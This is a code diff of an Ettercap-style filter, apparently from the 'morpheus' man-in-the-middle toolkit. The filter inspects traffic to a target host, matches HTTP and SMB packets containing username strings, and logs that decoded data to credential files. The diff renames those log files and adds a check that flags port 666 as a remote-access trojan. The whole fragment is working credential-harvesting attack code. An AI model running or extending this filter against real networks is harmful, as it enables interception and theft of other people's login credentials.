@@ -23,9 +23,9 @@ if (ip.src == '192.168.1.67' || ip.dst == '192.168.1.67') {
   msg("[Morpheus] packet from 192.168.1.67 (skynet) found...");
     if (ip.proto == TCP && tcp.src == 80 || tcp.dst == 80) {
       msg("[morpheus] ☆ host:192.168.1.67 ☆ port:80 http ☆");
-        # log credentials into morpheus/logs/credentials
+        # log credentials into morpheus/logs/httpcreds
         if (regex(DECODED.data, ".*username.*")) {
-         log(DECODED.data, "./credentials_log");
+         log(DECODED.data, "./httpcreds");
          msg("[morpheus] ☭ credentials found ☭ logfile stored! ☭\n");
     }else{
     if (ip.proto == TCP && tcp.src == 445 || tcp.dst == 445) {
@@ -37,12 +37,16 @@ if (ip.src == '192.168.1.67' || ip.dst == '192.168.1.67') {
     if (ip.proto == UDP && udp.src == 53 || udp.dst == 53) {
       msg("[morpheus] ☆ host:192.168.1.67 ☆ port:53 domain ☆");
     }else{
+    if (ip.proto == TCP && tcp.src == 666 || tcp.dst == 666) {
+      msg("\n[morpheus] ☭ host:192.168.1.67 ☭ port:666 RAT ☭\n");
+    }else{
     if (ip.proto == TCP && tcp.src == 139 || tcp.dst == 139) {
       msg("[morpheus] ☆ host:192.168.1.67 port:139 smb ☆");
         # log credentials into morpheus/logs/smbcreds
         if (regex(DECODED.data, ".*USER.*")) {
-         log(DECODED.data, "./smbcreds_log");
+         log(DECODED.data, "./smbcreds");
          msg("[morpheus] ☭ smb credentials found ☭ logfile stored! ☭\n");
+    }
     }
     }
     }
